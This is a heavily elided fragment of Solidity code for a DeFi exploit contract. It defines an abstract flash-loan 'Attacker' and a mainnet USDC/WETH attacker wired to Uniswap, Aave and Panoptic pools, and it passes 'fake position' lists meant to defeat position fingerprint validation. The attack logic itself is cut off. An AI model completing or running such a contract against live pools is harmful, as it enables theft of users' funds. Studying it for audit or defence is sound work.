...
abstract contract Attacker is IFlashLoanReceiver {
    // State variables
    ...
    function takeFlashLoanAndAttack() public virtual;

    // Shared utility: generate fingerprint for position validation
    ...
    // Shared utility: minimum of two values
    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }

    // Helper to create fake token list from uint array
...
contract USDC_WETH30bpsMainnetAttacker is Attacker {
  ...
  constructor(
      ...
      TokenId[] memory _twoRealPositions,
      uint256[] memory _fakePositionUints
  ) Attacker(_token0, _token1, _uniPool, _aavePool, _collateral0, _collateral1, _panopticPool, _sfpm, _firstRealPosition, _twoRealPositions, _fakePositionUints) {}

    function takeFlashLoanAndAttack() public override {
